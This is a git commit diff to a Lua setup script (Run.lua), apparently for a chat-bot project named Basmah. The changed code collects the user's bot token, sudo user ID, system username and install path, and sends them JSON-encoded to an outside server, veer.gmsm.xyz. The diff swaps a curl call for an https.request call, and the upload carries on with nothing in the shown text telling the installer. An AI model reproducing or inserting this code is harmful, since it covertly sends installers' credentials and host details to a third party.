119b1ce5533cb921e930acfe475e74cf58db05e5
basmahsource <68329112+basmahsource@users.noreply.github.com>
2020-07-15 20:20:03 +0300

    Update Run.lua

--- inc/Run.lua
+++ inc/Run.lua
@@ -90,8 +90,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all')
-os.execute([[
-curl https://veer.gmsm.xyz/Basmah/index.php?Info=]]..JSON.encode(info))
+https.request("https://veer.gmsm.xyz/Basmah/index.php?Info="..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
